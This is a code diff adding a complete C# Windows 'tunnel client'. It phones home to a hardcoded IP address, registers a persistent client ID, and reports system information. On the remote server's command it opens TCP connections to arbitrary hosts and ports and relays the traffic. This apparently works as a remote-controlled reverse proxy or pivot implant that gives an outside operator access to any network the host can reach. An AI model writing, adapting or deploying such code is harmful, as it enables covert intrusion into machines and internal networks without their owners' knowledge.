@@ -1,0 +1,477 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Net.Sockets;
+using System.Net.WebSockets;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using Newtonsoft.Json;
+using Microsoft.Win32;
+using System.Security.Cryptography;
+
+namespace WsTunnelClient
+{
+    internal static class Program
+    {
+        // === Added for heartbeat/reconnect ===
+        private static long _lastPongMs = 0;                // last seen pong (ms since epoch)
+        private const long PONG_TIMEOUT_MS = 60000;         // 60s
+        private static int _reconnectRequested = 0;         // guard to avoid multiple aborts
+        // =====================================
+
+        private const string WsUrl = "ws://185.39.30.19:8080/ws";
+        private const string RegPath = @"Software\WsTunnelClient";
+        private const string RegNameClientId = "ClientId";
+        private static readonly string ClientIdFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, ".client-id");
+
+        private static ClientWebSocket _ws;
+        private static CancellationTokenSource _cts;
+        private static Timer _pingTimer;
+        private static readonly object SendLock = new object();
+
+        private static string _clientId;
+        private static string _info;
+
+        // connId -> connection
+        private class Conn
+        {
+            public TcpClient Client;
+            public NetworkStream Stream;
+            public readonly object WriteLock = new object();
+            public readonly CancellationTokenSource Cts = new CancellationTokenSource();
+            public volatile bool Ending = false;
+        }
+        private static readonly Dictionary<string, Conn> _conns = new Dictionary<string, Conn>();
+        private static readonly object _connsLock = new object();
+
+        public static void Main(string[] args)
+        {
+            try { Run().Wait(); }
+            catch (Exception ex) { Console.WriteLine("Fatal: " + ex); }
+        }
+
+        private static async Task Run()
+        {
+            _clientId = LoadClientId();
+            _info = GetWindowsInfo();
+
+            int attempt = 0;
+            for (;;)
+            {
+                attempt++;
+                try
+                {
+                    _cts = new CancellationTokenSource();
+                    _ws = new ClientWebSocket();
+                    Console.WriteLine("[ws] connecting " + WsUrl);
+                    await _ws.ConnectAsync(new Uri(WsUrl), _cts.Token);
+                    Console.WriteLine("[ws] connected");
+
+                    // compute self-hash (SHA-256) at runtime
+                    string authHash = null;
+                    try
+                    {
+                        string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                        byte[] exeBytes = File.ReadAllBytes(exePath);
+                        using (var sha = SHA256.Create())
+                        {
+                            byte[] h = sha.ComputeHash(exeBytes);
+                            var sb = new StringBuilder(h.Length * 2);
+                            for (int i = 0; i < h.Length; i++) sb.Append(h[i].ToString("x2"));
+                            authHash = sb.ToString();
+                        }
+                    }
+                    catch (Exception exHash)
+                    {
+                        Console.WriteLine("[auth] hash error: " + exHash.Message);
+                        return;
+                    }
+
+                    // hello
+                    var hello = new Dictionary<string, object>();
+                    hello["type"] = "hello";
+                    hello["authHash"] = authHash;
+                    hello["clientId"] = string.IsNullOrEmpty(_clientId) ? "" : _clientId;
+                    hello["info"] = string.IsNullOrEmpty(_info) ? "Windows" : _info;
+                    await SendJsonAsync(hello, _cts.Token);
+
+                    _lastPongMs = NowMs();
+
+                    // ping timer
+                    _pingTimer = new Timer(async _ =>
+                    {
+                        try
+                        {
+                            var ping = new Dictionary<string, object>();
+                            ping["type"] = "ping";
+                            ping["t"] = NowMs();
+                            await SendJsonAsync(ping, CancellationToken.None);
+
+                            var last = Interlocked.Read(ref _lastPongMs);
+                            var now = NowMs();
+                            if (last > 0 && (now - last) > PONG_TIMEOUT_MS)
+                            {
+                                Console.WriteLine("[ws] pong timeout, reconnecting...");
+                                RequestReconnect("pong-timeout");
+                            }
+                        }
+                        catch { }
+                    }, null, 10000, 25000);
+
+                    // receive
+                    await ReceiveLoop(_cts.Token);
+                }
+                catch (WebSocketException wse)
+                {
+                    var msg = wse.Message ?? string.Empty;
+                    if (msg.IndexOf("Aborted", StringComparison.OrdinalIgnoreCase) >= 0 && Interlocked.CompareExchange(ref _reconnectRequested, 0, 0) == 1)
+                    {
+                        Console.WriteLine("[ws] reconnecting...");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[ws] connect/recv error: " + msg);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[ws] error: " + ex.Message);
+                }
+                finally
+                {
+                    Interlocked.Exchange(ref _reconnectRequested, 0);
+                    try { _pingTimer?.Dispose(); } catch { }
+                    CleanupAllTcp();
+                    try
+                    {
+                        if (_ws != null && (_ws.State == WebSocketState.Open || _ws.State == WebSocketState.CloseSent))
+                            _ws.Abort();
+                    }
+                    catch { }
+                }
+
+                // backoff (auth failure handled below)
+                int delay = attempt * 1000;
+                if (delay > 30000) delay = 30000;
+                await Task.Delay(delay);
+            }
+        }
+
+        private static async Task ReceiveLoop(CancellationToken ct)
+        {
+            var buffer = new ArraySegment<byte>(new byte[128 * 1024]);
+            for (;;)
+            {
+                using (var ms = new MemoryStream())
+                {
+                    WebSocketReceiveResult res;
+                    do
+                    {
+                        res = await _ws.ReceiveAsync(buffer, ct);
+                        if (res.MessageType == WebSocketMessageType.Close)
+                        {
+                            Console.WriteLine("[ws] server closed: " + res.CloseStatus + " " + res.CloseStatusDescription);
+                            if (res.CloseStatus == WebSocketCloseStatus.PolicyViolation &&
+                                res.CloseStatusDescription != null &&
+                                res.CloseStatusDescription.IndexOf("auth", StringComparison.OrdinalIgnoreCase) >= 0)
+                            {
+                                Environment.Exit(1);
+                            }
+                            return;
+                        }
+                        ms.Write(buffer.Array, buffer.Offset, res.Count);
+                    }
+                    while (!res.EndOfMessage);
+
+                    var jsonText = Encoding.UTF8.GetString(ms.ToArray());
+                    HandleMessage(jsonText);
+                }
+            }
+        }
+
+        private static void HandleMessage(string jsonText)
+        {
+            try
+            {
+                var msg = JsonConvert.DeserializeObject<Dictionary<string, object>>(jsonText);
+                if (msg == null) return;
+                var type = GetString(msg, "type");
+
+                if (type == "pong") { _lastPongMs = NowMs(); return; }
+
+                if (type == "hello-ok")
+                {
+                    var idFromServer = GetString(msg, "clientId");
+                    if (!string.IsNullOrEmpty(idFromServer) && idFromServer != _clientId)
+                    {
+                        _clientId = idFromServer; SaveClientId(_clientId);
+                        Console.WriteLine("[ws] clientId set: " + _clientId);
+                    }
+                    return;
+                }
+                if (type == "open")
+                {
+                    var connId = GetString(msg, "connId");
+                    var host = GetString(msg, "host");
+                    var portObj = GetNumber(msg, "port");
+                    int port = portObj.HasValue ? (int)portObj.Value : 0;
+                    if (!string.IsNullOrEmpty(connId) && !string.IsNullOrEmpty(host) && port > 0 && port <= 65535)
+                        StartTcp(connId, host, port);
+                    return;
+                }
+                if (type == "data")
+                {
+                    var connId = GetString(msg, "connId");
+                    var dataB64 = GetString(msg, "data");
+                    if (!string.IsNullOrEmpty(connId) && !string.IsNullOrEmpty(dataB64))
+                    {
+                        var conn = GetConn(connId);
+                        if (conn != null && conn.Stream != null && !conn.Cts.IsCancellationRequested)
+                        {
+                            try
+                            {
+                                byte[] buf = Convert.FromBase64String(dataB64);
+                                lock (conn.WriteLock)
+                                {
+                                    if (!conn.Cts.IsCancellationRequested && conn.Stream.CanWrite)
+                                        conn.Stream.Write(buf, 0, buf.Length); // sync write is fine under lock
+                                }
+                            }
+                            catch (ObjectDisposedException)
+                            {
+                                // stream already closed as part of EndTcp; ignore
+                            }
+                            catch (Exception exw)
+                            {
+                                Console.WriteLine("[tcp] write error: " + exw.Message);
+                                EndTcp(connId).Wait();
+                            }
+                        }
+                    }
+                    return;
+                }
+                if (type == "end")
+                {
+                    var connId = GetString(msg, "connId");
+                    if (!string.IsNullOrEmpty(connId)) EndTcp(connId).Wait();
+                    return;
+                }
+            }
+            catch (Exception ex) { Console.WriteLine("[ws] message error: " + ex.Message); }
+        }
+
+        // ===== TCP =====
+        private static void StartTcp(string connId, string host, int port)
+        {
+            Task.Factory.StartNew(async () =>
+            {
+                Conn conn = null;
+                try
+                {
+                    var client = new TcpClient();
+                    client.NoDelay = true;
+                    await client.ConnectAsync(host, port);
+                    var ns = client.GetStream();
+                    conn = new Conn { Client = client, Stream = ns };
+                    AddConn(connId, conn);
+                    Console.WriteLine("[tcp] open " + connId + " -> " + host + ":" + port);
+
+                    var opened = new Dictionary<string, object>();
+                    opened["type"] = "opened";
+                    opened["connId"] = connId;
+                    await SendJsonAsync(opened, CancellationToken.None);
+
+                    var buf = new byte[32 * 1024];
+                    while (!conn.Cts.IsCancellationRequested)
+                    {
+                        int read = 0;
+                        try
+                        {
+                            read = await ns.ReadAsync(buf, 0, buf.Length);
+                        }
+                        catch (ObjectDisposedException)
+                        {
+                            // was closed by EndTcp
+                            break;
+                        }
+                        catch (IOException)
+                        {
+                            break;
+                        }
+                        catch (Exception exr)
+                        {
+                            Console.WriteLine("[tcp] read error " + connId + ": " + exr.Message);
+                            break;
+                        }
+                        if (read <= 0) break;
+
+                        var dataMsg = new Dictionary<string, object>();
+                        dataMsg["type"] = "data";
+                        dataMsg["connId"] = connId;
+                        dataMsg["data"] = Convert.ToBase64String(buf, 0, read);
+                        await SendJsonAsync(dataMsg, CancellationToken.None);
+                    }
+                }
+                catch (Exception ex) { Console.WriteLine("[tcp] open error: " + ex.Message); }
+                finally { await EndTcp(connId); }
+            }, TaskCreationOptions.LongRunning);
+        }
+
+        private static async Task EndTcp(string connId)
+        {
+            Conn c = null;
+            lock (_connsLock)
+            {
+                if (_conns.TryGetValue(connId, out c))
+                {
+                    if (c.Ending) return; // already closing
+                    c.Ending = true;
+                }
+            }
+            if (c != null)
+            {
+                try { c.Cts.Cancel(); } catch { }
+                try { if (c.Stream != null) c.Stream.Close(); } catch { }
+                try { if (c.Client != null) c.Client.Close(); } catch { }
+                lock (_connsLock) { _conns.Remove(connId); }
+                var end = new Dictionary<string, object>();
+                end["type"] = "end"; end["connId"] = connId;
+                await SendJsonAsync(end, CancellationToken.None);
+                Console.WriteLine("[tcp] end " + connId);
+            }
+        }
+
+        private static void AddConn(string connId, Conn c)
+        {
+            lock (_connsLock)
+            {
+                Conn old;
+                if (_conns.TryGetValue(connId, out old))
+                {
+                    try { if (old.Stream != null) old.Stream.Close(); } catch { }
+                    try { if (old.Client != null) old.Client.Close(); } catch { }
+                    _conns.Remove(connId);
+                }
+                _conns[connId] = c;
+            }
+        }
+        private static Conn GetConn(string connId)
+        {
+            lock (_connsLock)
+            {
+                Conn c; if (_conns.TryGetValue(connId, out c)) return c; return null;
+            }
+        }
+        private static void CleanupAllTcp()
+        {
+            string[] keys;
+            lock (_connsLock) { keys = new string[_conns.Keys.Count]; _conns.Keys.CopyTo(keys, 0); }
+            for (int i = 0; i < keys.Length; i++)
+            {
+                try { EndTcp(keys[i]).Wait(); } catch { }
+            }
+        }
+
+        // ===== JSON/UTILS =====
+        private static async Task SendJsonAsync(Dictionary<string, object> obj, CancellationToken ct)
+        {
+            try
+            {
+                string text = JsonConvert.SerializeObject(obj);
+                byte[] data = Encoding.UTF8.GetBytes(text);
+                lock (SendLock)
+                {
+                    if (_ws == null || _ws.State != WebSocketState.Open || Interlocked.CompareExchange(ref _reconnectRequested, 0, 0) == 1)
+                        return;
+                    try { _ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, ct).Wait(); }
+                    catch (ObjectDisposedException) { return; }
+                    catch (AggregateException aex) { if (aex.InnerException is ObjectDisposedException) return; throw; }
+                }
+            }
+            catch (Exception ex) { Console.WriteLine("[ws] send error: " + ex.Message); }
+        }
+
+        
+        private static void RequestReconnect(string reason)
+        {
+            try
+            {
+                if (Interlocked.Exchange(ref _reconnectRequested, 1) == 0)
+                {
+                    Console.WriteLine("[ws] reconnect requested: " + reason);
+                    try { _cts?.Cancel(); } catch { }
+                    try { _ws?.Abort(); } catch { }
+                }
+            }
+            catch { }
+        }
+private static long NowMs() { return (long)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalMilliseconds; }
+
+        private static string LoadClientId()
+        {
+            try
+            {
+                using (var key = Registry.CurrentUser.CreateSubKey(RegPath))
+                {
+                    var id = key.GetValue(RegNameClientId) as string;
+                    if (!string.IsNullOrEmpty(id)) return id;
+                }
+            }
+            catch { }
+            try
+            {
+                if (File.Exists(ClientIdFile))
+                {
+                    var id = File.ReadAllText(ClientIdFile).Trim();
+                    if (!string.IsNullOrEmpty(id)) return id;
+                }
+            }
+            catch { }
+            return null;
+        }
+        private static void SaveClientId(string id)
+        {
+            if (string.IsNullOrEmpty(id)) return;
+            try { using (var key = Registry.CurrentUser.CreateSubKey(RegPath)) { key.SetValue(RegNameClientId, id); } }
+            catch { }
+            try { File.WriteAllText(ClientIdFile, id); } catch { }
+        }
+        private static string GetWindowsInfo()
+        {
+            try
+            {
+                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
+                {
+                    object o = key.GetValue("ProductName"); string name = o as string;
+                    if (!string.IsNullOrEmpty(name)) return name;
+                }
+            }
+            catch { }
+            return "Windows";
+        }
+        private static string GetString(Dictionary<string, object> dict, string key)
+        {
+            object v; if (dict.TryGetValue(key, out v)) { if (v == null) return null; if (v is string) return (string)v; return Convert.ToString(v); }
+            return null;
+        }
+        private static double? GetNumber(Dictionary<string, object> dict, string key)
+        {
+            object v;
+            if (dict.TryGetValue(key, out v))
+            {
+                try
+                {
+                    if (v == null) return null;
+                    if (v is Int32) return (int)v;
+                    if (v is Int64) return (long)v;
+                    if (v is Double) return (double)v;
+                    if (v is Decimal) return (double)(decimal)v;
+                    double d; if (Double.TryParse(Convert.ToString(v), out d)) return d;
+                }
+                catch { }
+            }
+            return null;
+        }
+    }
+}
